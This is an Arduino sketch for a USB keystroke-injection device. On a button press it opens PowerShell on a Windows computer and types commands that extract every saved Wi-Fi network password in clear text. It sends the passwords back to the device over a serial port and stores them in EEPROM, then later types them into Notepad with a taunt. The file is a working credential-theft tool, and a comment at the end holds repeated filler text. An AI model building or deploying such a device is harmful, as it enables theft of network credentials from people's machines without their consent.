#include <Keyboard.h>
#include <EEPROM.h>

char stringArray[500] = {""};
boolean extracted = false, dispatched = false;
const int extractButton = 7;  // Use internal pull-up
const int dispatchButton = 9; // Use internal pull-up

void setup() {
  Serial.begin(9600);

  // No need for pinMode as internal pull-up is enabled by default
  Keyboard.begin();
}

void loop() {
  // Check button states using digitalRead with internal pull-up
  if (digitalRead(extractButton) == HIGH && !extracted) {
    extractingData();
    extracted = true;
  }

  if (digitalRead(dispatchButton) == HIGH && !dispatched) {
    dispatchingData();
    dispatched = true;
  }
}

void extractingData() {
    delay(100);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.print("Powershell");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.println("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String -OutVariable dataCaptured");
    delay(500);

    Keyboard.println("$comPort = ((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\" | Where {$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\")");
    delay(200);
    Keyboard.println("$comPort = [int]$comPort[$comPort.length - 1].replace(\")\", \"\")");
    delay(200);
    Keyboard.print("$serialObject = new-Object System.IO.Ports.SerialPort COM");
    Keyboard.print("$comPort");
    Keyboard.println(", 9600, None, 8, one");
    delay(200);
    Keyboard.println("$serialObject.Open()");
    delay(200);
    Keyboard.println("$serialObject.Write(\"$dataCaptured\")");
    delay(200);
    Keyboard.println("$serialObject.close()");
    delay(200);
    Keyboard.println("exit");
    delay(200);
    for(int i=0; i<sizeof(stringArray)-1; i++)
        stringArray[i] = Serial.read();
    EEPROM.put(1, stringArray);
}

void dispatchingData() {
    delay(100);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.println("notepad");
    delay(700);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(100);
    Keyboard.print(EEPROM.get(1, stringArray));
    delay(100);
    Keyboard.println("SBKA BAAP EK");
}

//Message for NotepadMessage for NotepadMessage for NotepadMessage for NotepadMessage for NotepadMessage for Notepad
